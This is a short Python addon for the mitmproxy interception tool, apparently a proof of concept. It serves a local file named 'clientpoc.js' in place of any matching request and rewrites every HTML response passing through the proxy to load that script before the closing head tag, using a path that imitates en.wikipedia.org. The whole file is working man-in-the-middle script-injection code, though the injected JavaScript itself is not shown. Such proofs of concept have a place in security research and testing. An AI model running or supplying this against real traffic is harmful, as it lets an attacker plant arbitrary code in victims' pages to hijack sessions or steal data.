
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if "clientpoc.js" in flow.request.pretty_url:
        with open('clientpoc.js', 'r') as content_file:
            content = content_file.read()

        flow.response = http.HTTPResponse.make(
            200,
            content,
            {"Content-Type": "application/javascript"}
        )

def response(flow: http.HTTPFlow) -> None:
    # print(flow.response.headers.get(""))
    content_type = flow.response.headers.get(b'content-type')
    if content_type and content_type.startswith("text/html"):
        inject = b"<script src='en.wikipedia.org/clientpoc.js'></script></head>"
        flow.response.content = flow.response.content.replace(b"</head>", inject)
